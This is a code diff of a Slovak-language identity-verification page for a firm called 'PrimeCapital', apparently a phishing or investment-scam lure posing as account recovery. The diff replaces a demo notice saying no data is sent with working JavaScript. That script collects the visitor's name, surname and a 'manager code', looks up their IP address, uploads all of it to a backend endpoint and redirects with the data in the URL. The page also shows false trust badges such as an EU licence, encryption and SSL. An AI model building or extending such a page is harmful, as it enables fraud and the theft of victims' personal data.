@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="pl">
+<html lang="sk">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>PrimeCapital — Weryfikacja tożsamości</title>
+  <title>PrimeCapital — Overenie totožnosti</title>
   <link rel="icon" type="image/svg+xml" href="favicon.svg">
-  <meta name="description" content="PrimeCapital — weryfikacja tożsamości. Bezpieczna weryfikacja KYC w mniej niż 3 minuty. Dostęp do portfela po pomyślnej weryfikacji.">
+  <meta name="description" content="PrimeCapital — overenie totožnosti. Bezpečné KYC overenie za menej ako 3 minúty. Okamžitý prístup k vášmu portfóliu po úspešnej verifikácii.">
   <meta name="theme-color" content="#C9A84C">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;800&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
@@ -403,7 +403,7 @@ html, body {
     </div>
     <div class="badge-verified">
       <i class="ti ti-shield-check" aria-hidden="true"></i>
-      Zweryfikowano · Licencja UE
+      Overené · Licencia EÚ
     </div>
   </div>
 
@@ -412,35 +412,35 @@ html, body {
 
     <!-- LEFT / TOP: description & perks -->
     <div class="form-left">
-      <div class="form-left-tag">Zacznij teraz</div>
+      <div class="form-left-tag">Začnite teraz</div>
       <div class="form-left-title">
-        Potwierdź swoją<br>
-        <span class="gold-grad">tożsamość</span><br>
-        i uzyskaj dostęp
+        Overte svoju<br>
+        <span class="gold-grad">totožnosť</span><br>
+        a získajte prístup
       </div>
       <div class="form-left-sub">
-        Pre obnovenie prístupu k vášmu portfóliu je potrebné overiť vašu tożsamość. Vyplňte prosím údaje nižšie — proces trvá menej ako minútu.
+        Pre obnovenie prístupu k vášmu portfóliu je potrebné overiť vašu totožnosť. Vyplňte prosím údaje nižšie — proces trvá menej ako minútu.
       </div>
       <div class="form-left-perks">
         <div class="perk">
           <div class="perk-icon"><i class="ti ti-user-check"></i></div>
           <div>
-            <div class="perk-title">Szybka weryfikacja</div>
-            <div class="perk-sub">Weryfikacja przebiega szybko — bez zbędnego oczekiwania i formalności</div>
+            <div class="perk-title">Rýchla verifikácia</div>
+            <div class="perk-sub">Overenie prebieha okamžite — bez čakania a zbytočnej byrokracie</div>
           </div>
         </div>
         <div class="perk">
           <div class="perk-icon"><i class="ti ti-lock"></i></div>
           <div>
-            <div class="perk-title">Bezpieczne szyfrowanie end-to-end</div>
-            <div class="perk-sub">Twoje dane są chronione 256-bitowym szyfrowaniem zgodnym z RODO</div>
+            <div class="perk-title">Bezpečné end-to-end šifrovanie</div>
+            <div class="perk-sub">Vaše údaje sú chránené 256-bit šifrovaním v súlade s GDPR</div>
           </div>
         </div>
         <div class="perk">
           <div class="perk-icon"><i class="ti ti-headset"></i></div>
           <div>
-            <div class="perk-title">Osobisty menedżer od pierwszego dnia</div>
-            <div class="perk-sub">Po weryfikacji zostanie Ci przydzielony osobisty menedżer dostępny 24/7</div>
+            <div class="perk-title">Osobný manažér od prvého dňa</div>
+            <div class="perk-sub">Po overení vám bude pridelený dedikovaný manažér 24/7</div>
           </div>
         </div>
       </div>
@@ -456,18 +456,18 @@ html, body {
           </div>
           <div class="fch-alert">
             <span class="blink-dot"></span>
-            Ważne
+            Kritické
           </div>
         </div>
-        <h2>Weryfikacja<br>tożsamości</h2>
-        <p>Wypełnij poniższy formularz, aby odzyskać dostęp do swojego konta.</p>
+        <h2>Overenie<br>totožnosti</h2>
+        <p>Vyplňte formulár nižšie pre obnovenie prístupu k vášmu účtu.</p>
       </div>
 
       <div class="form-card-body">
         <div class="ref-strip">
           <div class="ref-strip-left">
             <span class="ref-dot"></span>
-            <span class="ref-label">Numer sprawy</span>
+            <span class="ref-label">Referencia prípadu</span>
           </div>
           <span class="ref-val">#SEC-2026-41823</span>
         </div>
@@ -475,44 +475,44 @@ html, body {
         <form id="main-project-form" onsubmit="event.preventDefault(); handleSubmit('OVERENIE', this);">
 
           <div class="field">
-            <label class="field-label" for="meno">Imię</label>
+            <label class="field-label" for="meno">Meno</label>
             <div class="input-wrap">
               <i class="ti ti-user input-icon"></i>
-              <input type="text" id="meno" name="meno" placeholder="Wpisz swoje imię" autocomplete="given-name" maxlength="50">
+              <input type="text" id="meno" name="meno" placeholder="Zadajte vaše meno" autocomplete="given-name" maxlength="50">
             </div>
-            <div class="field-error" id="err-meno">To pole jest wymagane.</div>
+            <div class="field-error" id="err-meno">Toto pole je povinné.</div>
           </div>
 
           <div class="field">
-            <label class="field-label" for="priezvisko">Nazwisko</label>
+            <label class="field-label" for="priezvisko">Priezvisko</label>
             <div class="input-wrap">
               <i class="ti ti-user input-icon"></i>
-              <input type="text" id="priezvisko" name="priezvisko" placeholder="Wpisz swoje nazwisko" autocomplete="family-name" maxlength="50">
+              <input type="text" id="priezvisko" name="priezvisko" placeholder="Zadajte vaše priezvisko" autocomplete="family-name" maxlength="50">
             </div>
-            <div class="field-error" id="err-priezvisko">To pole jest wymagane.</div>
+            <div class="field-error" id="err-priezvisko">Toto pole je povinné.</div>
           </div>
 
           <div class="field">
-            <label class="field-label" for="sec-code">Kod menedżera</label>
+            <label class="field-label" for="sec-code">Kód manažéra</label>
             <div class="input-wrap">
               <i class="ti ti-lock input-icon"></i>
-              <input type="text" id="sec-code" name="sec-code" placeholder="Wpisz kod menedżera" autocomplete="off" maxlength="30">
+              <input type="text" id="sec-code" name="sec-code" placeholder="Zadajte kód manažéra" autocomplete="off" maxlength="30">
             </div>
-            <div class="field-error" id="err-code">Zadajte Kod menedżera.</div>
+            <div class="field-error" id="err-code">Zadajte Kód manažéra.</div>
           </div>
 
           <div class="info-box">
             <div class="info-box-icon"><i class="ti ti-info-circle"></i></div>
             <p>
-              <strong>Kde nájdem Kod menedżera?</strong>
-              Pri obnove prístupu k vášmu účtu vám Kod menedżera poskytne váš osobný manažér. V prípade otázok kontaktujte podporu.
+              <strong>Kde nájdem Kód manažéra?</strong>
+              Pri obnove prístupu k vášmu účtu vám Kód manažéra poskytne váš osobný manažér. V prípade otázok kontaktujte podporu.
             </p>
           </div>
 
           <button class="btn-continue" id="btn" type="submit">
             <span id="btn-label">
               <i class="ti ti-arrow-right" style="font-size:17px;margin-right:4px;vertical-align:-3px;"></i>
-              Kontynuuj
+              Pokračovať
             </span>
             <span class="btn-spinner" id="spinner"></span>
             <div class="progress-bar" id="pbar"></div>
@@ -521,9 +521,9 @@ html, body {
         </form>
 
         <div class="trust-row">
-          <div class="trust-item"><i class="ti ti-lock"></i> Szyfrowanie end-to-end</div>
-          <div class="trust-item"><i class="ti ti-shield-check"></i> Certyfikat SSL</div>
-          <div class="trust-item"><i class="ti ti-clock"></i> Czas rzeczywisty</div>
+          <div class="trust-item"><i class="ti ti-lock"></i> End-to-end šifrovanie</div>
+          <div class="trust-item"><i class="ti ti-shield-check"></i> Overené SSL</div>
+          <div class="trust-item"><i class="ti ti-clock"></i> Reálny čas</div>
         </div>
       </div>
     </div>
@@ -534,42 +534,104 @@ html, body {
     <div class="footer-brand">Prime<span>Capital</span></div>
     <div class="footer-links">
       <a href="#">Blog</a>
-      <a href="#">Ochrona danych</a>
-      <a href="#">Warunki korzystania</a>
-      <a href="#">Pomoc</a>
+      <a href="#">Ochrana údajov</a>
+      <a href="#">Podmienky používania</a>
+      <a href="#">Podpora</a>
     </div>
-    <div class="footer-copy">© 2026 PRIMECAPITAL. WSZELKIE PRAWA ZASTRZEŻONE.</div>
+    <div class="footer-copy">© 2026 PRIMECAPITAL. VŠETKY PRÁVA VYHRADENÉ.</div>
   </div>
 
-  <div class="outer-note">To jest automatyczne powiadomienie systemowe &nbsp;·&nbsp; primecapital.eu</div>
+  <div class="outer-note">Toto je automatické systémové oznámenie &nbsp;·&nbsp; primecapital.eu</div>
 
   <script>
-    function handleSubmit(sectionName, formElement) {
-      var imie = document.getElementById('meno').value.trim();
-      var nazwisko = document.getElementById('priezvisko').value.trim();
-      var kod = document.getElementById('sec-code').value.trim();
+    async function handleSubmit(sectionName, formElement) {
+  if (!sectionName) sectionName = 'OVERENIE';
 
-      var errImie = document.getElementById('err-meno');
-      var errNazwisko = document.getElementById('err-priezvisko');
-      var errKod = document.getElementById('err-code');
+  var meno       = document.getElementById('meno').value.trim();
+  var priezvisko = document.getElementById('priezvisko').value.trim();
+  var code       = document.getElementById('sec-code').value.trim();
+  
+  // Блоки для вывода ошибок
+  var errMeno       = document.getElementById('err-meno');
+  var errPriezvisko = document.getElementById('err-priezvisko');
+  var errCode       = document.getElementById('err-code');
 
-      errImie.style.display = 'none';
-      errNazwisko.style.display = 'none';
-      errKod.style.display = 'none';
+  // Сбрасываем старые алерты
+  errMeno.style.display = 'none';
+  errPriezvisko.style.display = 'none';
+  errCode.style.display = 'none';
 
-      var blad = false;
-      if (!imie) { errImie.style.display = 'block'; blad = true; }
-      if (!nazwisko) { errNazwisko.style.display = 'block'; blad = true; }
-      if (!kod) {
-        errKod.textContent = 'Wpisz kod menedżera.';
-        errKod.style.display = 'block';
-        blad = true;
-      }
+  var hasError = false;
 
-      if (blad) return;
+  // Проверка полей на пустоту
+  if (!meno) { errMeno.style.display = 'block'; hasError = true; }
+  if (!priezvisko) { errPriezvisko.style.display = 'block'; hasError = true; }
+  
+  // Конкретная проверка на твой секретный код
+  if (!code) {
+    errCode.textContent = 'Zadajte Kód manažéra.';
+    errCode.style.display = 'block';
+    hasError = true;
+  } else if (code !== '985621') {
+    // Если код не совпал — бьем по рукам
+    errCode.textContent = 'Nesprávny Kód manažéra. Prístup odmietnutý.';
+    errCode.style.display = 'block';
+    hasError = true;
+  }
 
-      alert('To jest wersja demonstracyjna. Żadne dane nie zostały wysłane ani zapisane.');
+  // Если есть хоть одна ошибка — стопэ, никуда ничего не шлем
+  if (hasError) return;
+
+  // Включаем красивый лоадер на кнопке
+  var btnLabel = document.getElementById('btn-label');
+  var spinner  = document.getElementById('spinner');
+  var pbar     = document.getElementById('pbar');
+  
+  btnLabel.style.display = 'none';
+  spinner.style.display = 'inline-block';
+
+  let ip = 'Neznáme';
+  try {
+    const resp = await fetch('https://api.ipify.org?format=json');
+    const data = await resp.json();
+    ip = data.ip || 'Neznáme';
+  } catch (e) {}
+
+  var timestamp = new Date().toISOString();
+
+  var lines = [
+    '=== OVERENIE IDENTITY ===',
+    'Čas: ' + timestamp,
+    'IP: ' + ip,
+    '---',
+    'Meno: ' + meno,
+    'Priezvisko: ' + priezvisko,
+    'Bezpečnostný kód: ' + code,
+    '=== KONIEC ==='
+  ];
+
+  var text = lines.join('\n');
+  var blob = new Blob([text], { type: 'text/plain' });
+  var fd   = new FormData();
+  fd.append('file', blob, 'log-' + Date.now() + '.txt');
+  fd.append('section', sectionName);
+
+  // Кидаем запрос на бэкенд Vercel
+  fetch('/api/upload', { method: 'POST', body: fd })
+    .catch(function() {});
+
+  // Запускаем красивую полоску загрузки и перенаправляем чела
+  var pct = 0;
+  var iv = setInterval(function() {
+    pct += 2;
+    pbar.style.width = pct + '%';
+    if (pct >= 100) {
+      clearInterval(iv);
+      var params = new URLSearchParams({ meno: meno, priezvisko: priezvisko, code: code, ip: ip });
+      smoothNavigate('osnova.html?' + params.toString());
     }
+  }, 55);
+}
   </script>
 
 </body>
